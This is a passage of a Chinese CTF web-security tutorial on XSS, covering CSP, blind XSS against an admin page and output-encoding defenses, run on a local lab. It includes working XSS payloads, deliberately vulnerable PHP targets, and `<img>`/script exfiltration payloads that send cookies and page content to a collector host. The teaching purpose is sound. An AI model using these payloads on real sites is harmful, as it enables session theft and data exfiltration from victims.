收集器记录了完整的到达请求：路径里的 `c=STEAL`、Cookie 头（真实场景里就是 bot 的登录 cookie，flag 常在其中）、Referer（暴露受害者是从哪个页面被带出来的）。==外带链路的三个环节——payload 落在受害者会加载的页面、浏览器自动发起外带请求、收集器落日志——前两环的浏览器行为在 CTF 里由 bot 完成，本地演示用 curl 代发这一次请求==。

## 7. CSP：Content-Security-Policy

CSP 是服务端用响应头给浏览器下的资源白名单：声明这个页面允许加载、执行哪些来源的资源，由浏览器执行。==它和 CORS 一样是浏览器的策略，curl 没有 CSP 概念，永远拿得到完整响应==（[[W01-Web安全导论与HTTP深化|W01]] 5.3 的 CORS 结论在这里原样成立）。

主要指令与取值：

| 指令/取值 | 管什么 |
| ---- | ---- |
| `default-src` | 各类资源的默认上限，被更具体的指令逐项覆盖 |
| `script-src` | JS 的加载与执行——XSS 防御的核心指令 |
| `img-src` | 图片加载——`<img src>` 型外带走的通道 |
| `connect-src` | fetch / XHR / WebSocket |
| `style-src` / `frame-src` / `object-src` | 样式 / iframe / 插件对象 |
| `'self'` | 同源资源 |
| `'unsafe-inline'` | 放行内联 `<script>` 与事件属性——对 XSS 相当于不设防 |
| `'unsafe-eval'` | 放行 `eval` / `new Function` 一类字符串转代码 |
| `'nonce-随机串'` / `'sha256-哈希'` | 精确放行携带对应 nonce 或哈希的单段代码 |

靶场 `csp.php`：注入点与 `reflect.php` 相同，`mode` 参数切换响应头强度：

```php
<?php
/* csp.php —— CSP 靶：mode 切换响应头强度，?name= 反射注入点不变 */
$mode = $_GET['mode'] ?? 'weak';
$name = $_GET['name'] ?? 'guest';
if ($mode === 'strict') {
    header("Content-Security-Policy: default-src 'self'");
} else {
    header("Content-Security-Policy: default-src 'self' 'unsafe-inline'");
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>CSP 靶</title></head>
<body>
<h1>Hello, <?= $name ?>!</h1>
</body>
</html>
```

curl 只负责确认响应头（`-i` 把响应头一并打出）：

```bash
curl -si --noproxy '*' 'http://127.0.0.1:8801/csp.php?name=%3Csvg%20onload=alert(1)%3E&mode=weak' | sed -n '/Content-Security-Policy/p;/<h1>/p'
curl -si --noproxy '*' 'http://127.0.0.1:8801/csp.php?name=%3Csvg%20onload=alert(1)%3E&mode=strict' | sed -n '/Content-Security-Policy/p;/<h1>/p'
```

输出：

```
Content-Security-Policy: default-src 'self' 'unsafe-inline'
<h1>Hello, <svg onload=alert(1)>!</h1>
```

```
Content-Security-Policy: default-src 'self'
<h1>Hello, <svg onload=alert(1)>!</h1>
```

两种模式下响应体完全一样，payload 都在——差别只在头，而头的执行方是浏览器。

**弱配置（unsafe-inline）**：在浏览器访问 `mode=weak` 的 URL，弹窗照常出现——`'unsafe-inline'` 把内联事件属性整个放行，`onload` 属于内联事件，CSP 等于没设。加 `'unsafe-inline'` 的 CSP 是常见的不彻底加固。

**严格配置（只有 'self'）**：访问 `mode=strict` 的同一 URL，弹窗不再出现。DevTools 确认路径：F12 打开 Console，能看到一条 CSP 违规报错，Chrome 的措辞形如 "Refused to execute inline event handler because it violates the following Content Security Policy directive: default-src 'self'"。同一个头同时拦住了外带：`<img src="http://收集器/...">` 触发 `img-src` 违规（没有单独设 `img-src`，回落到 `default-src`），Console 里多一条图片加载被拒的报错，收集器收不到请求。==严格 CSP 一次掐掉执行与外带两条通道，这是它排在防御清单里的原因==。

> [!info]- nonce 与被忽略的 unsafe-inline
> 现行规范里，`script-src` 一旦出现 `'nonce-...'` 或 `'sha256-...'`，浏览器就**忽略** `'unsafe-inline'`——想放行页面里唯一的统计脚本，正确做法是给它配 nonce（`<script nonce="随机串">`），而不是把 `'unsafe-inline'` 加回来。老资料按旧规范写的"unsafe-inline 优先于 nonce"已不成立。另外两个常见失误：只设 `script-src` 不设 `img-src`，外带通道回落到宽松的 `default-src`；白名单域上存在用户可控内容（可上传的目录、带回调参数的 JSONP 接口），攻击者让浏览器从"合法域"加载恶意 JS，CSP 照样放行。

## 8. 盲 XSS：打看不见的页面

有一类注入点，payload 存进去之后，回显发生的页面攻击者自己访问不到——典型是后台审核页：你提交的内容只有管理员登录后台才能看到。payload 打进去，执行发生在管理员的浏览器里，这就是盲 XSS。

==盲 XSS 是存储型 XSS 的特例：存储与触发机制完全一样，差别只在"执行发生的页面你看不到"==，所以唯一能依赖的观测手段是回调收集器——payload 必须自带外带能力，执行与否只能靠收集器有没有收到请求来回答。

靶场补一面后台页 `admin.php`（已随靶场给出）。它带一道请求头令牌校验（[[W01-Web安全导论与HTTP深化|W01]] 2.3 的题型：头不对就 403），模拟"攻击者够不到的页面"：

```php
<?php
/* admin.php —— 后台审核页（盲 XSS 的触发现场）：带令牌校验，攻击者拿不到这个头 */
$token = $_SERVER['HTTP_X_ADMIN_TOKEN'] ?? '';
if ($token !== 'admin-2026') {
    http_response_code(403);
    header('Content-Type: text/plain; charset=utf-8');
    echo "403 Forbidden: admin only\n";
    exit;
}
$db = new PDO('sqlite:' . __DIR__ . '/board.sqlite');
?>
<!-- 下面的列表与 index.php 相同：留言原样回显 -->
```

本地链路分四步走。第一步，注入（留言 #3）：

```bash
curl -s --noproxy '*' -d 'msg=<img src="http://127.0.0.1:8804/blind">' http://127.0.0.1:8801/index.php -o /dev/null -w '%{http_code}\n'
```

输出：

```
200
```

第二步，确认攻击者看不到执行现场——不带令牌访问后台：

```bash
curl -s --noproxy '*' http://127.0.0.1:8801/admin.php
```

输出：

```
403 Forbidden: admin only
```

第三步，确认 payload 在等。这是带令牌视角（演示用，真实场景里攻击者拿不到）：

```bash
curl -s --noproxy '*' -H 'X-Admin-Token: admin-2026' http://127.0.0.1:8801/admin.php | grep '<li>'
```

输出：

```
  <li>#3 <img src="http://127.0.0.1:8804/blind"></li>
  <li>#2 <img src="http://127.0.0.1:8804/hit?c=STEAL"></li>
  <li>#1 <img src=x onerror=alert(1)></li>
```

第四步，模拟管理员打开后台：浏览器会加载列表里的 `<img>` 并向收集器发请求，用 curl 直接代发这一次（收集器地址与 6.3 相同）：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8804/blind
cat /tmp/w08/hits.log
```

输出：

```
200
/blind | UA: curl/8.18.0 | Cookie: - | Referer: -
```

`/blind` 到达收集器——回调链路成立。真实场景里，这一步由管理员浏览器在打开后台时自动完成，攻击者唯一能确认的就是这行日志；收到，说明注入点存在且 payload 执行了。

盲 XSS 的 payload 讲究与存储型不同：触发可能只有一次、错过就没了，所以要求==指向收集器的代码尽量健壮、一次尽量多收集==。常用构造是 `<script src="http://收集器/bx.js"></script>` 拉取一段受控 JS，由它上报当前 URL、cookie 与页面内容片段；社区有现成的盲打平台脚本做这件事，机制与 6.3 的 `<img>` 外带相同。CTF 题面出现"后台""审核""管理员会看"这类提示词时，优先考虑盲 XSS 打法。

## 9. 防御

XSS 的根因与 SQL 注入相同：==数据被当成了代码==。对应的核心防御也相同，只有一条：在**输出**的位置把数据变回数据。

**输出编码：`htmlspecialchars()`**。把 HTML 的五个保留字符转义成实体，标签从此只能以文本形态存在：

| 字符 | 转义后 |
| ---- | ---- |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;`（需 `ENT_QUOTES`；PHP 8.1 起默认包含） |
| `<` | `&lt;` |
| `>` | `&gt;` |

靶场的安全版 `safe.php`：与 `index.php` 读**同一个库**，唯一的差别是输出前过了 `htmlspecialchars`：

```php
<?php
/* safe.php —— 防御对照靶：与 index.php 共用同一个库，输出前 htmlspecialchars 编码 */
$db = new PDO('sqlite:' . __DIR__ . '/board.sqlite');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec('CREATE TABLE IF NOT EXISTS msgs(id INTEGER PRIMARY KEY AUTOINCREMENT, msg TEXT)');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $st = $db->prepare('INSERT INTO msgs(msg) VALUES (?)');
    $st->execute([$_POST['msg'] ?? '']);
}
function e(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
?>
<!-- 列表输出一行改为：<li>#<?= $row['id'] ?> <?= e($row['msg']) ?></li> -->
```

先经 `safe.php` 补一条带引号的留言（#4），然后把两个页面对同一个库的输出放在一起看：

```bash
curl -s --noproxy '*' -d 'msg=x" onfocus=alert(1)' http://127.0.0.1:8801/safe.php -o /dev/null -w '%{http_code}\n'
curl -s --noproxy '*' http://127.0.0.1:8801/safe.php | grep '<li>'
```

输出：

```
200
  <li>#4 x&quot; onfocus=alert(1)</li>
  <li>#3 &lt;img src=&quot;http://127.0.0.1:8804/blind&quot;&gt;</li>
  <li>#2 &lt;img src=&quot;http://127.0.0.1:8804/hit?c=STEAL&quot;&gt;</li>
  <li>#1 &lt;img src=x onerror=alert(1)&gt;</li>
```

```bash
curl -s --noproxy '*' http://127.0.0.1:8801/index.php | grep '<li>'
```

输出：

```
  <li>#4 x" onfocus=alert(1)</li>
  <li>#3 <img src="http://127.0.0.1:8804/blind"></li>
  <li>#2 <img src="http://127.0.0.1:8804/hit?c=STEAL"></li>
  <li>#1 <img src=x onerror=alert(1)></li>
```

同一条记录（比如 #4 的引号逃逸 payload），在 `index.php` 里是活的标签属性，在 `safe.php` 里是 `x&quot; onfocus=...` 的字面文本——浏览器把它渲染成一行看得懂的文字，不解析。两个事实跟着这个对照一起立起来：==库里的数据是原文，转义发生在输出侧==；==同一份数据，转义的出口安全、未转义的出口危险——防御要覆盖每一个输出点==。存转义文再输出是常见错误实现：数据换一个出口（JSON 接口、导出文件）就露馅，还造成双重转义。

编码要按输出上下文选函数：

| 输出上下文 | 处理方式 |
| ---- | ---- |
| HTML 正文 | `htmlspecialchars` |
| 属性值（含单引号属性） | `htmlspecialchars` + `ENT_QUOTES` |
| URL（`href`/`src` 的值） | 先校验协议白名单（只放 `http`/`https`），再整体编码 |
| JS 内的数据 | 结构化传递（`json_encode`），不做字符串拼接 |
| CSS | 不接受用户输入 |

**HttpOnly**：cookie 侧的补充防线，[[W01-Web安全导论与HTTP深化|W01]] 3.1 的结论——XSS 读不到它，但请求照样携带；它把"偷 cookie"这条路堵死，逼攻击者去打页面内容与请求伪造。会话 cookie 应默认带上（PHP 的 `session.cookie_httponly=1`）。

**模板自动转义**：主流模板引擎（Jinja2、Twig 等）默认对变量输出自动转义，相当于把 `htmlspecialchars` 做成默认行为；模板里出现 `| raw`、"safe" 这类关闭转义的标记处要人工过一遍——它们是自动转义体系里的手工豁免点。

**CSP 作纵深**：第 7 节的严格配置在编码漏防时兜底，拦内联执行与外带通道。

> [!warning] 黑名单过滤不是防御
> 第 4 节的三级绕过就是证明：拦 `<script>` 挡不住事件属性，拦尖括号挡不住属性注入，拦引号挡不住无引号构造，而且每一级都还有变体没列完。过滤至多是纵深里的薄层，==输出编码才是结构保证：转义后的数据在语法上无法变成标签，与攻击者的想象力无关==。用过滤替代编码是 XSS 修复最常见的假动作。

## 10. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| curl 输出里 payload 原样在，浏览器访问却不执行 | 先分上下文：payload 可能落在属性值、`<textarea>` 或 JS 字符串里，没进正文，用标记串定位回显位置（[[#3.5 属性内注入：引号逃逸\|3.5]]）；再看响应头有没有 CSP，Console 里的违规报错会指认是哪条指令拦的（第 7 节） |
| 实体编码的 payload 穿过了过滤器却没执行 | 服务端把 `&lt;` 当普通文本输出，浏览器解码后进的是文本节点，不会再被解析成标签（[[#4.3 Level 2：拦尖括号\|4.3]]）；实体编码只在"解码后需要成为属性值内容"的场景成立 |
| 明明做了转义还是中招 | 存在第二个出口：同一份数据流到了别的页面、JSON 接口或 JS 拼接点，那里没转义；按"每个输出点单独转义"逐一排查（第 9 节） |
| CSP 加了还被打 | `'unsafe-inline'` 没去掉；或 `script-src` 白名单域上有用户可控内容（可上传目录、JSONP）；或只设了 `script-src`，`img-src`/`connect-src` 回落到宽松的 `default-src`，外带通道还开着 |
| `<script>` 拆分法失效 | 过滤是"命中即拒绝"型（拆分只骗删除式）或循环删除型；发一次 `<scr<script>ipt>` 看回显判型，拒绝型换标签事件（[[#4.2 Level 1：拦 script 标签\|4.2]] 的折叠框） |
| `<img onerror>` 不触发 | `src` 缺失或指向能加载成功的资源都不会触发 `onerror`；给一个必然加载失败的值，如 `src=x` |
| `#` 后面的 payload 服务器日志里完全没有 | fragment 不进 HTTP 请求（[[10-网络协议基础\|10 章]]的报文结构）；hash 型 DOM XSS 的 payload 只存在于浏览器，curl 与服务端日志都看不到它（第 5 节） |
| payload 里的 `&` 把参数截断，只收到一半 | `&` 是 URL 参数分隔符，值里的 `&` 写 `%26`，payload 整体做 URL 编码（本章约定） |
| 远程靶的收集器一直收不到回调 | 收集地址写了 `127.0.0.1` 或内网地址，bot 够不到；换 bot 可达的公网地址或题目提供的上报接口（[[#6.2 CTF 的 bot 机制\|6.2]]） |
| bot 访问后只弹窗没外带 | 外带失败先查收集地址可达性，再查目标是否有 CSP 拦了图片与脚本外链（第 7 节）；flag 在页面里时改打 DOM 读取后外带，不必只盯 cookie |
| 目标 cookie 全是 HttpOnly，XSS 是不是白打了 | 偷不到 cookie 但能以受害者身份操作：请求伪造、读页面内容外带、键盘记录（[[#6.1 偷 cookie 与 HttpOnly\|6.1]]）；CTF 的 flag 常在页面文本里 |
| 转义后页面上出现 `&amp;lt;` 这类双重实体 | 转义做了两遍（入库前存了转义文，输出又转一次）；按"存原文、输出时转义"重排（第 9 节） |

## 11. 配套练习与延伸阅读

> [!note] 实战任务：完整走一遍攻防闭环
> 在自己的目录里从零搭起本章全部靶面（留言板、反射页、过滤靶、DOM 页、CSP 靶、后台页、收集器），限时完成一轮攻击：三处上下文各探测一次 → 存储型外带 → 过滤靶三级各走通一条绕过 → 盲打后台拿到回调；然后把靶改成安全版（输出编码 + 严格 CSP），复打全部 payload 确认全部失效，Console 里指认每条被拦 payload 的违规指令。

配套练习：

1. 给 `filter.php` 加 level 4：同时删 `<` `>` `"` `'` 和空格。先用单发 payload 摸清每一级的实际行为（删除式还是拒绝式），再组合构造（斜杠代空格 + 无引号事件属性），把"哪条构造为什么能过"写成对照表。
2. 把 `dom.html` 改安全版：两处 `innerHTML` 换成 `textContent`，重放 hash payload，确认它显示为字面文本；再想一个确实需要渲染用户 HTML 的场景（评论区富文本），说明这类需求为什么不能靠简单换函数解决，正确方向是什么（白名单过滤 + 输出编码，如 DOMPurify 一类库）。
3. 用 [[06-Python与CTF脚本基础|06 章]]的 requests 写一个"bot"：定时 GET 留言板列表页。跑起来后观察收集器永远收不到回调——解释原因（requests 不解析 HTML、不加载子资源），这个实验就是"CTF 的 bot 为什么必须是真浏览器"的直接证明。
4. 给 `csp.php` 加第三种模式：`script-src 'self' 'nonce-测试串'`，页面里放一个带对应 nonce 的合法 `<script>`。在浏览器里确认：带 nonce 的脚本执行、`<svg onload>` 被拦——nonce 只作用于 script 元素，不覆盖内联事件属性。
5. 去 [[11-Web安全版图与Burp|11 章]]第 5 节清单的 DVWA（安全等级 Low）把 reflected、stored、DOM 三关各打一遍，起点一律是本章 3.5 节的上下文探测，不许直接抄 payload。

延伸阅读：

- OWASP XSS Prevention Cheat Sheet（cheatsheetseries.owasp.org）：按输出上下文给转义规则全集，本章第 9 节的展开与权威版本；
- PortSwigger Web Security Academy 的 Cross-site scripting 章节（portswigger.net/web-security）：三型各有一组免费互动实验，含 DOM 型专章与 CSP 绕过实验；
- MDN 的 Content Security Policy 文档（developer.mozilla.org）：指令全集与 nonce/hash 语义的权威说明；
- PayloadsAllTheThings 的 XSS 篇（GitHub）：按上下文归类的 payload 速查表，本章之外的变体从这里续；
- 平台与书单见 [[01-练习平台索引|05-资源索引·练习平台]] 与 [[02-书单与Wiki|05-资源索引·书单]]，工具索引见 [[03-工具清单|05-资源索引·工具清单]]。

下一站：[[W09-SSTI|W09]]——"输入被当成代码执行"换到模板引擎里再演一遍，探测手法（`{{7*7}}`）与 XSS 的上下文探测同源；[[W07-文件上传|W07]] 的上传目录若允许落 HTML/SVG，存储型 XSS 会借道文件上传重演。
